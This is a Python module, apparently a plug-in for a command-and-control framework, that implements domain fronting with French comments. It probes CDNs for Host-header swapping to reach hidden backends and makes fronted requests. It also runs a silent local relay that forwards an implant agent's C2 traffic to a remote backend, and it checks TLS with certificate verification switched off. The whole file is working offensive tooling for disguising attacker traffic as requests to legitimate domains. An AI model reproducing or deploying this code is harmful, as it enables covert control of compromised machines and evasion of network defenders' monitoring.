"""
domain_fronting — C2-Mesh-Proxy (fronting) / Domain fronting.
Fronting de domaine: requetes HTTP(S) via CDN avec Host header legitime,
sonde SNI/TLS, relais HTTP. Multi-plateforme, stdlib.
Actions: probe, request, relay, sni_check
"""
NAME = "domain_fronting"
VERSION = "1.0.0"
DESCRIPTION = "Domain fronting: CDN host-header swapping, sonde TLS/SNI, relais HTTP."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import base64
import json
import socket
import ssl
import urllib.request


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def run(action, params):
    try:
        if action == "probe":
            return _probe(params)
        if action == "request":
            return _request(params)
        if action == "relay":
            return _relay(params)
        if action == "sni_check":
            return _sni_check(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="domain_fronting: " + str(exc), status="failed")


def _headers(params, extra=None):
    h = {"User-Agent": params.get("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
         "Accept": "*/*"}
    front = params.get("front", "")
    if front:
        h["Host"] = front
    if extra:
        h.update(extra)
    return h


def _probe(params):
    """Teste si un CDN front permet d'atteindre le backend via Host swap."""
    cdn = params.get("cdn", "")
    backend = params.get("backend", "")
    path = params.get("path", "/")
    if not cdn or not backend:
        return _result(error="Need cdn + backend", status="failed")
    url = "https://" + cdn + path
    results = []
    for host in [backend, cdn]:
        try:
            req = urllib.request.Request(url, headers=_headers(params, {"Host": host}))
            with urllib.request.urlopen(req, timeout=15) as resp:
                body = resp.read(512)
                results.append({"host": host, "status": resp.status,
                                "server": resp.headers.get("Server", ""),
                                "body_prefix": body[:80].decode("utf-8", "replace"),
                                "ok": True})
        except Exception as exc:
            results.append({"host": host, "error": str(exc)[:200], "ok": False})
    return _result(data={"cdn": cdn, "backend": backend, "probes": results})


def _request(params):
    url = params.get("url", "")
    if not url:
        return _result(error="No url", status="failed")
    method = params.get("method", "GET")
    body = params.get("data")
    if body and not isinstance(body, bytes):
        try:
            body = base64.b64decode(body)
        except Exception:
            body = body.encode()
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in _headers(params).items():
        req.add_header(k, v)
    with urllib.request.urlopen(req, timeout=int(params.get("timeout", 20))) as resp:
        raw = resp.read(int(params.get("max_body", 65536)))
    try:
        text = raw.decode("utf-8")
    except Exception:
        text = ""
    return _result(data={"status": resp.status,
                         "headers": dict(resp.headers),
                         "body": text[:20000],
                         "body_b64": base64.b64encode(raw).decode() if not text else "",
                         "size": len(raw)})


def _relay(params):
    """Relais: l'agent repond a la requete C2 locale et la transmet via front."""
    listen = params.get("listen", "127.0.0.1")
    port = int(params.get("port", 8080))
    target = params.get("target", "")
    if not target:
        return _result(error="No target backend", status="failed")
    import http.server
    import threading
    class H(http.server.BaseHTTPRequestHandler):
        def _fwd(self):
            try:
                ln = int(self.headers.get("Content-Length", 0))
                data = self.rfile.read(ln) if ln else None
                req = urllib.request.Request(target + self.path, data=data,
                                             method=self.command)
                for k, v in self.headers.items():
                    if k.lower() not in ("host", "content-length"):
                        req.add_header(k, v)
                with urllib.request.urlopen(req, timeout=20) as resp:
                    body = resp.read()
                    self.send_response(resp.status)
                    for k, v in resp.headers.items():
                        if k.lower() not in ("transfer-encoding", "connection"):
                            self.send_header(k, v)
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
            except Exception as exc:
                self.send_response(502)
                self.end_headers()
                self.wfile.write(str(exc).encode())
        do_GET = _fwd
        do_POST = _fwd
        do_PUT = _fwd
        def log_message(self, *a):
            pass
    srv = http.server.ThreadingHTTPServer((listen, port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return _result(data={"relay_listening": listen + ":" + str(port),
                         "target": target})


def _sni_check(params):
    host = params.get("host", "")
    port = int(params.get("port", 443))
    if not host:
        return _result(error="No host", status="failed")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as tls:
                cert = tls.getpeercert(binary_form=True)
                return _result(data={"host": host, "tls": True,
                                     "version": tls.version(),
                                     "cipher": tls.cipher(),
                                     "cert_size": len(cert or b"")})
    except Exception as exc:
        return _result(data={"host": host, "tls": False,
                             "error": str(exc)[:200]})
